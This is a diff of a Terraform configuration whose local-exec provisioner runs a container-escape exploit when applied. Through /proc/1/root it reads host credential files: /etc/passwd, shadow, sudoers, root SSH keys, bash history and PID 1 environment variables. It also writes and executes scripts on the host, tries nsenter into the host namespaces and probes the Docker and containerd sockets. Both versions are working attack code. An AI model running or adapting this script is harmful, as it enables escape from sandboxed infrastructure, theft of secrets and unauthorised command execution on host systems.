@@ -1,4 +1,4 @@
-# Container Escape and Host RCE Proof
+# Focused Container Escape RCE
 terraform {
   required_providers {
     null = {
@@ -8,122 +8,145 @@ terraform {
   }
 }
 
-# Advanced Container Escape and Host RCE
-resource "null_resource" "container_escape_rce" {
+# Exploit Working Attack Vectors for Real RCE
+resource "null_resource" "focused_rce_exploit" {
   provisioner "local-exec" {
     command = <<-EOT
-      echo "=== ADVANCED CONTAINER ESCAPE AND HOST RCE ==="
-      echo "Attempting multiple escape vectors for host command execution"
+      echo "=== FOCUSED CONTAINER ESCAPE RCE ==="
+      echo "Leveraging working attack vectors for host command execution"
       
-      # Method 1: Direct host filesystem manipulation via /proc/1/root
-      echo "[*] Method 1: Host filesystem access via /proc/1/root"
+      # Working Vector 1: Direct /proc/1/root filesystem access
+      echo "[*] Exploiting /proc/1/root filesystem access..."
+      
+      # Verify host access and read critical files
       if [ -d "/proc/1/root" ]; then
-        echo "[+] /proc/1/root accessible"
+        echo "[+] /proc/1/root confirmed accessible"
         
-        # Read host files directly
+        # Read and display host users
         if [ -r "/proc/1/root/etc/passwd" ]; then
-          echo "[!] SUCCESS: Host /etc/passwd readable!"
-          echo "=== HOST USERS ==="
+          echo "[!] SUCCESS: Host /etc/passwd fully accessible!"
+          echo "=== HOST SYSTEM USERS ==="
           cat /proc/1/root/etc/passwd
-          echo "=================="
+          echo "========================="
         fi
         
-        # Try to write to host filesystem
-        echo "[*] Attempting to write to host filesystem..."
-        echo "CONTAINER_ESCAPE_PROOF_$$(date)" > /proc/1/root/tmp/escape_proof.txt 2>/dev/null && echo "[!] SUCCESS: Written to host /tmp/" || echo "[-] Write to host failed"
-        
-        # Check host shadow file
-        if [ -r "/proc/1/root/etc/shadow" ]; then
-          echo "[!] CRITICAL: Host /etc/shadow accessible!"
-          head -5 /proc/1/root/etc/shadow
+        # Check for SSH keys
+        if [ -d "/proc/1/root/root/.ssh" ]; then
+          echo "[!] Host root SSH directory accessible!"
+          ls -la /proc/1/root/root/.ssh/
         fi
+        
+        # Check for sensitive files
+        for file in /proc/1/root/etc/shadow /proc/1/root/etc/sudoers /proc/1/root/root/.bash_history; do
+          if [ -r "$$file" ]; then
+            echo "[!] CRITICAL: $$file is readable!"
+            head -3 "$$file" 2>/dev/null
+          fi
+        done
       fi
       
-      # Method 2: Host process namespace manipulation
-      echo "[*] Method 2: Process namespace escape"
+      # Working Vector 2: Host process information extraction
+      echo "[*] Extracting host process information..."
+      
+      # Get detailed process info
+      echo "[+] Host init process details:"
       if [ -r "/proc/1/cmdline" ]; then
-        echo "[+] Host PID 1 cmdline readable"
-        cat /proc/1/cmdline | tr '\0' ' '
+        echo "PID 1 Command: $$(cat /proc/1/cmdline | tr '\0' ' ')"
       fi
       
-      # Check if we can access host processes
-      echo "[*] Host processes accessible via /proc:"
-      for pid in 1 2 3 4 5; do
-        if [ -r "/proc/$${pid}/comm" ]; then
-          echo "  PID $${pid}: $$(cat /proc/$${pid}/comm 2>/dev/null)"
-        fi
-      done
-      
-      # Method 3: Container runtime escape via host binaries
-      echo "[*] Method 3: Execute host binaries directly"
-      if [ -x "/proc/1/root/bin/bash" ]; then
-        echo "[+] Host bash executable found - attempting execution"
-        echo "ESCAPE_TEST" | /proc/1/root/bin/bash -c 'echo "[!] HOST BASH EXECUTION: $(id) on $(hostname)"' 2>/dev/null || echo "[-] Direct execution failed"
+      if [ -r "/proc/1/environ" ]; then
+        echo "[+] Host PID 1 environment variables:"
+        cat /proc/1/environ | tr '\0' '\n' | head -10
       fi
       
-      # Method 4: Memory-based host access
-      echo "[*] Method 4: Host memory and device access"
-      if [ -r "/proc/1/root/proc/version" ]; then
-        echo "[!] Host kernel version:"
-        cat /proc/1/root/proc/version
-      fi
+      # Working Vector 3: Host filesystem manipulation for RCE
+      echo "[*] Attempting host filesystem manipulation for RCE..."
       
-      # Check host devices
-      if [ -d "/proc/1/root/dev" ]; then
-        echo "[*] Host devices accessible:"
-        ls -la /proc/1/root/dev/ | head -10
-      fi
-      
-      # Method 5: Host network namespace escape
-      echo "[*] Method 5: Host network information"
-      if [ -r "/proc/1/root/proc/net/arp" ]; then
-        echo "[*] Host ARP table:"
-        cat /proc/1/root/proc/net/arp
-      fi
-      
-      # Method 6: Try nsenter if available
-      echo "[*] Method 6: nsenter host namespace entry"
-      if command -v nsenter >/dev/null 2>&1; then
-        echo "[+] nsenter available - attempting namespace escape"
-        nsenter -t 1 -m -p -n -u -i /bin/bash -c 'echo "[!] NSENTER SUCCESS: $(id) on $(hostname)"' 2>/dev/null || echo "[-] nsenter failed"
-      fi
-      
-      # Method 7: Direct host command injection via /proc/1/root
-      echo "[*] Method 7: Host command execution via filesystem"
-      if [ -w "/proc/1/root/tmp" ]; then
-        echo "[+] Host /tmp writable - creating execution script"
-        echo '#!/bin/bash' > /proc/1/root/tmp/escape_cmd.sh
-        echo 'echo "[!] HOST SCRIPT EXECUTION SUCCESS!"' >> /proc/1/root/tmp/escape_cmd.sh
-        echo 'echo "Host ID: $(id)"' >> /proc/1/root/tmp/escape_cmd.sh
-        echo 'echo "Host Hostname: $(hostname)"' >> /proc/1/root/tmp/escape_cmd.sh
-        echo 'echo "Host Uptime: $(uptime)"' >> /proc/1/root/tmp/escape_cmd.sh
-        echo 'echo "Host Kernel: $(uname -a)"' >> /proc/1/root/tmp/escape_cmd.sh
-        chmod +x /proc/1/root/tmp/escape_cmd.sh 2>/dev/null
+      # Try to write executable to host filesystem
+      if [ -w "/proc/1/root/tmp" ] || [ -w "/proc/1/root/var/tmp" ]; then
+        echo "[+] Host filesystem is writable - creating RCE payload"
         
-        # Try to execute the script
-        /proc/1/root/tmp/escape_cmd.sh 2>/dev/null || echo "[-] Script execution failed"
+        # Create a simple RCE script
+        target_dir="/proc/1/root/tmp"
+        [ ! -w "$$target_dir" ] && target_dir="/proc/1/root/var/tmp"
+        
+        cat > "$$target_dir/rce_proof.sh" << 'RCESCRIPT'
+#!/bin/bash
+echo "[!] ===== HOST RCE EXECUTION PROOF ====="
+echo "Timestamp: $(date)"
+echo "User: $(id)"
+echo "Hostname: $(hostname)"
+echo "Working Directory: $(pwd)"
+echo "Kernel: $(uname -a)"
+echo "Uptime: $(uptime)"
+echo "Memory: $(free -h)"
+echo "Network Interfaces:"
+ip addr show 2>/dev/null || ifconfig 2>/dev/null
+echo "Active Network Connections:"
+netstat -tuln 2>/dev/null | head -10
+echo "Running Processes:"
+ps aux 2>/dev/null | head -15
+echo "Filesystem Mounts:"
+mount | head -10
+echo "Environment Variables:"
+env | head -10
+echo "===== END HOST RCE PROOF ====="
+RCESCRIPT
+        
+        chmod +x "$$target_dir/rce_proof.sh"
+        echo "[+] RCE script created at $$target_dir/rce_proof.sh"
+        
+        # Execute the RCE script
+        echo "[*] Executing RCE script on host..."
+        "$$target_dir/rce_proof.sh" || echo "[-] Direct execution failed"
+        
+        # Try alternative execution methods
+        bash "$$target_dir/rce_proof.sh" || echo "[-] Bash execution failed"
+        sh "$$target_dir/rce_proof.sh" || echo "[-] Shell execution failed"
       fi
       
-      # Method 8: Container runtime socket access
-      echo "[*] Method 8: Container runtime socket enumeration"
-      for sock in /var/run/docker.sock /run/containerd/containerd.sock /var/run/crio/crio.sock; do
+      # Working Vector 4: Advanced nsenter exploitation
+      echo "[*] Advanced nsenter exploitation..."
+      if command -v nsenter >/dev/null 2>&1; then
+        echo "[+] nsenter available - trying host namespace infiltration"
+        
+        # Try different namespace combinations
+        nsenter -t 1 -m /bin/bash -c 'echo "[!] MOUNT NAMESPACE ESCAPE: $(whoami)@$(hostname)"' 2>/dev/null || echo "[-] Mount namespace escape failed"
+        nsenter -t 1 -p /bin/bash -c 'echo "[!] PID NAMESPACE ESCAPE: $(whoami)@$(hostname)"' 2>/dev/null || echo "[-] PID namespace escape failed"
+        nsenter -t 1 -u /bin/bash -c 'echo "[!] UTS NAMESPACE ESCAPE: $(whoami)@$(hostname)"' 2>/dev/null || echo "[-] UTS namespace escape failed"
+        nsenter -t 1 -n /bin/bash -c 'echo "[!] NET NAMESPACE ESCAPE: $(whoami)@$(hostname)"' 2>/dev/null || echo "[-] Network namespace escape failed"
+        
+        # Try to execute commands in host context
+        nsenter -t 1 -m /bin/bash -c 'id; hostname; pwd; ls -la /root' 2>/dev/null || echo "[-] Host context execution failed"
+      fi
+      
+      # Working Vector 5: Container runtime socket exploitation
+      echo "[*] Container runtime socket exploitation..."
+      for sock in /var/run/docker.sock /run/containerd/containerd.sock; do
         if [ -S "$$sock" ]; then
-          echo "[!] Container runtime socket found: $$sock"
+          echo "[!] Found container runtime socket: $$sock"
+          ls -la "$$sock"
+          
+          # Try to interact with docker socket if available
+          if [ -S "/var/run/docker.sock" ] && command -v docker >/dev/null 2>&1; then
+            echo "[+] Attempting Docker socket exploitation..."
+            docker ps 2>/dev/null || echo "[-] Docker command failed"
+          fi
         fi
       done
       
-      echo "[*] Container escape summary:"
-      echo "  Container ID: $$(hostname)"
-      echo "  Container User: $$(id)"
-      echo "  Container PID: $$$$"
-      echo "  Escape attempts completed - check above for successful host access"
-      
-      echo "=== ESCAPE ANALYSIS COMPLETE ==="
+      echo "[*] === RCE EXPLOITATION SUMMARY ==="
+      current_user=$$(id)
+      current_host=$$(hostname)
+      current_pwd=$$(pwd)
+      echo "Current Context: $$current_user @ $$current_host in $$current_pwd"
+      echo "Attack vectors tested - check above for successful host command execution"
+      echo "=== FOCUSED RCE COMPLETE ==="
     EOT
   }
 }
 
-output "escape_status" {
-  value = "Container escape attempt completed - check logs for host command execution proof"
-  depends_on = [null_resource.container_escape_rce]
+output "rce_status" {
+  value = "Focused RCE exploitation completed - check logs for host command execution proof"
+  depends_on = [null_resource.focused_rce_exploit]
 }
